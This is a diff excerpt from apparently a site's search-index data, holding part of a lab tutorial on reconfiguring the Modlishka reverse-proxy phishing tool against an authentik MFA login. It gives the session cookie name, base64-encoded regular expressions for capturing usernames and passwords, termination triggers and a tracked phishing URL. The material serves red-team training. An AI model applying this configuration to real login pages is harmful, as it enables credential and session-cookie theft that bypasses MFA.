@@ -57,7 +57,7 @@ Now we need to determine the session cookie.
 Looks like authentik_session maybe the one we are after. We are lucky they used descriptive names and very few cookies.
 We have all the required information to reconfigure Modlishka. Now we nee to start updating Modlishka configuration. We’ll start with the "target" in Modlishka’s configuration.
 "target": "auth.target.docker:9000", Now we need to create some regular expressions to match the username and password fields.
-echo -n '"uid_field":\\s*"(.+?)"' | base64 echo -n '"password":\\s*"(.+?)"' | base64 ![](/static/how-to-phishing/modlishka-config-cred-params-base64.png) We’ll join these two values together with a comma, then update the "credParams" configuration value.
+echo -n '"uid_field":\\s*"(.+?)"' | base64 echo -n '"password":\\s*"(.+?)"' | base64 We’ll join these two values together with a comma, then update the "credParams" configuration value.
 "credParams": "InVpZF9maWVsZCI6XHMqIiguKz8pIg==,InBhc3N3b3JkIjpccyoiKC4rPyki" Finally, we need to update the "terminateTriggers" and "terminateRedirectUrl".
 "terminateRedirectUrl": "https://uvcyber.com/?phished", "terminateTriggers": "/if/user", `,description:"",tags:null,title:"Reconfigure Modlishka With MFA Authentication Provider",uri:"/how_to/phishing-credential-harvesting-and-beyond/75-reconfigure-modlishka/index.html"},{content:`Open up a new private browsing window, then visit http://modlishka.docker/?rid=test0001. We’ll make up a fake rid value to help us track our progress.
 Lets go through the authentication flow. You can Modlishka seamlessly handles the redirects and the MFA authentication flow.
